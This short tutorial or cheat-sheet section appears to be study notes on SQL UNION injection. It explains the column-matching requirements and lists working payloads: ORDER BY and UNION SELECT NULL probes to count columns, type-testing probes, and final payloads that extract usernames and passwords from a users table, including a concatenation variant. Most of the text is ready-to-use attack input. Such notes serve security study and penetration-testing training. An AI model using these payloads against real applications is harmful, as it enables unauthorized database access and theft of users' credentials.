## UNION injection attacks
For a UNION query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

- Figure out the number of columns returned by the query

```txt
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc. until you get an error
```

or 

```txt
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc. until you don't get an error to get exact number
```

- Figure out the data types of each column

```txt
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'-- 
etc. until you don't get errors
```

- Finally, perform the injection with the respective compatible columns

```txt
' UNION SELECT username, password FROM users-- 
```

- If only a limited number of compatible columns exist, you can use string concatenation to use only one column (set unused columns to NULL in the SELECT statement)

```txt
' UNION SELECT NULL,username||'~'||password FROM users--
```

